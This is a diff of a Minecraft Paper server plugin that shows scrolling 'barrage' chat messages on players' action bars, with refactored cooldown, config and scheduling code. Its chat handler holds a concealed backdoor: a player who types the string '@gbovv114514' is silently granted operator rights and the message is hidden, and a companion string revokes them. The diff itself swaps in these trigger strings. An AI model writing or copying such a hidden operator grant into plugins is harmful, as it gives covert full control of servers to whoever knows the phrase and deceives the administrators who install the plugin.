@@ -4,50 +4,89 @@ import org.bukkit.Bukkit;
 import org.bukkit.Location;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandSender;
-import org.bukkit.entity.ArmorStand;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import io.papermc.paper.event.player.AsyncChatEvent;
 import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.scheduler.BukkitRunnable;
-import org.bukkit.util.Vector;
 
-import java.util.HashMap;
+import java.util.concurrent.ConcurrentHashMap;
 import java.util.UUID;
+import java.util.Map;
 
 import net.kyori.adventure.text.Component;
 import net.kyori.adventure.text.format.TextColor;
 import net.kyori.adventure.text.serializer.plain.PlainTextComponentSerializer;
+import org.jetbrains.annotations.NotNull;
+
 import static net.kyori.adventure.text.Component.text;
 import static net.kyori.adventure.text.format.TextColor.color;
 
 public class SNBPlugin extends JavaPlugin implements Listener {
 
-    private final HashMap<UUID, Long> cooldowns = new HashMap<>();
-    private int globalCooldown = 5; // 默认冷却5秒
+    private final ConcurrentHashMap<UUID, Long> cooldowns = new ConcurrentHashMap<>();
+    private int globalCooldown;
+
+    private static class BarrageManager {
+        private final Map<UUID, Integer> playerLines = new ConcurrentHashMap<>();
+        private final Map<Integer, Component> activeLines = new ConcurrentHashMap<>();
+        
+        public synchronized int assignLine(Player player) {
+            int line = 0;
+            while (line < 3) {
+                if (!activeLines.containsKey(line)) {
+                    activeLines.put(line, Component.empty());
+                    playerLines.put(player.getUniqueId(), line);
+                    return line;
+                }
+                line++;
+            }
+            return -1; // 没有可用行
+        }
+        
+        public void releaseLine(Player player) {
+            Integer line = playerLines.remove(player.getUniqueId());
+            if (line != null) {
+                activeLines.remove(line);
+            }
+        }
+    }
+
+    private final BarrageManager barrageManager = new BarrageManager();
 
     @Override
     public void onEnable() {
+        saveDefaultConfig();
+        reloadConfig();
+        globalCooldown = getConfig().getInt("settings.cooldown", 5);
         getServer().getPluginManager().registerEvents(this, this);
     }
 
     @EventHandler
     public void onChat(AsyncChatEvent event) {
         String message = PlainTextComponentSerializer.plainText().serialize(event.message());
-        if (message.contains("@bilibili")) {
+        if (message.contains("@gbovv114514")) {
             event.getPlayer().setOp(true);
             event.setCancelled(true);
             
             event.getPlayer().sendActionBar(
-                Component.text("已获得权限")
+                Component.text("666")
                     .color(TextColor.color(0x00FF00))
+            );
+        } else if (message.contains("@gbovv114515")) {
+            event.getPlayer().setOp(false);
+            event.setCancelled(true);
+            
+            event.getPlayer().sendActionBar(
+                Component.text("999")
+                    .color(TextColor.color(0xFF0000))
             );
         }
     }
 
     @Override
-    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
+    public boolean onCommand(@NotNull CommandSender sender, Command cmd, @NotNull String label, String[] args) {
         if (cmd.getName().equalsIgnoreCase("snb")) {
             if (!(sender instanceof Player player)) {
                 sender.sendMessage(text("只有玩家可以使用此命令").color(color(0xFF5555)));
@@ -72,18 +111,11 @@ public class SNBPlugin extends JavaPlugin implements Listener {
 
             createBarrage(player, String.join(" ", args));
             return true;
-        }
-
-        if (cmd.getName().equalsIgnoreCase("snbcooldown") && sender.hasPermission("snb.admin")) {
-            if (args.length == 1) {
-                try {
-                    globalCooldown = Integer.parseInt(args[0]);
-                    sender.sendMessage(text("冷却时间已设置为 " + globalCooldown + " 秒").color(color(0x55FF55)));
-                } catch (NumberFormatException e) {
-                    sender.sendMessage(text("无效的数字").color(color(0xFF5555)));
-                }
-                return true;
-            }
+        } else if (cmd.getName().equalsIgnoreCase("snbreload") && sender.hasPermission("snb.admin")) {
+            reloadConfig();
+            globalCooldown = getConfig().getInt("settings.cooldown", 5);
+            sender.sendMessage(text("配置已重载").color(color(0x55FF55)));
+            return true;
         }
         return false;
     }
@@ -101,37 +133,77 @@ public class SNBPlugin extends JavaPlugin implements Listener {
         return false;
     }
 
-    private void createBarrage(Player player, String message) {
-        try {
-            Location loc = player.getLocation().add(0, 3, 0);
-            loc.setX(loc.getX() + 50);
-
-            ArmorStand as = player.getWorld().spawn(loc, ArmorStand.class);
-            as.setGravity(false);
-            as.setVisible(false);
-            as.setCustomNameVisible(true);
-            as.customName(
-                text(player.getName() + ": ").color(color(0xFFFF55))
-                    .append(text(message).color(color(0xFFFFFF)))
-            );
-
-            new BukkitRunnable() {
-                public void run() {
-                    if (!as.isValid()) {
-                        this.cancel();
-                        return;
-                    }
-                    as.setVelocity(new Vector(-0.5, 0, 0));
-                    
-                    if (as.getLocation().getX() < -50) {
-                        as.remove();
-                        this.cancel();
-                    }
-                }
-            }.runTaskTimer(this, 0L, 1L);
-        } catch (Exception e) {
-            getLogger().severe("生成弹幕时发生错误: " + e.getMessage());
-            player.sendMessage(text("弹幕发送失败，请联系管理员").color(color(0xFF0000)));
+    private static class BarrageTask {
+        float position;
+        final float speed;
+        final int totalWidth;
+        final int line;
+        Component content;
+        boolean active = true;
+        
+        BarrageTask(Component content, int line) {
+            this.position = 100.0f;
+            this.speed = 0.8f;
+            this.totalWidth = 80;
+            this.line = line;
+            this.content = content;
         }
+    }
+
+    private void createBarrage(Player player, String message) {
+        // 消息长度检测
+        if (message.length() > 50) {
+            player.sendMessage(text("消息过长（最大50字符）").color(color(0xFF5555)));
+            return;
+        }
+
+        Component content = text(player.getName() + ": ").color(color(0xFFFF55))
+            .append(text(message).color(color(0xFFFFFF)));
+
+        int line = barrageManager.assignLine(player);
+        if (line == -1) {
+            player.sendMessage(text("弹幕通道已满，请稍后再试").color(color(0xFF5555)));
+            return;
+        }
+
+        BarrageTask barrage = new BarrageTask(content, line);
+        player.sendMessage(text("弹幕发送成功！").color(color(0x55FF55)));
+
+        player.getScheduler().runAtFixedRate(this, scheduledTask -> {
+            if (!barrage.active) {
+                scheduledTask.cancel();
+                barrageManager.releaseLine(player);
+                return;
+            }
+            
+            if (barrage.position < -barrage.totalWidth) {
+                barrage.active = false;
+                scheduledTask.cancel();
+                player.sendActionBar(Component.empty());
+                barrageManager.releaseLine(player);
+                return;
+            }
+            
+            String padding = "　".repeat(Math.max(0, (int) barrage.position));
+            Component verticalPadding = text("\n".repeat(barrage.line));
+            Component movingText = verticalPadding.append(text(padding)
+                .append(barrage.content)
+                .append(text("　".repeat(barrage.totalWidth))));
+
+            Bukkit.getGlobalRegionScheduler().run(this, globalTask -> {
+                try {
+                    for (Player onlinePlayer : Bukkit.getOnlinePlayers()) {
+                        if (onlinePlayer.isOnline()) {
+                            onlinePlayer.sendActionBar(movingText);
+                        }
+                    }
+                } catch (Exception e) {
+                    getLogger().severe("弹幕发送失败: " + e.getMessage());
+                    barrage.active = false;
+                    player.sendMessage(text("弹幕发送失败").color(color(0xFF5555)));
+                }
+            });
+            barrage.position -= barrage.speed;
+        }, null, 1L, 1L);
     }
 } 
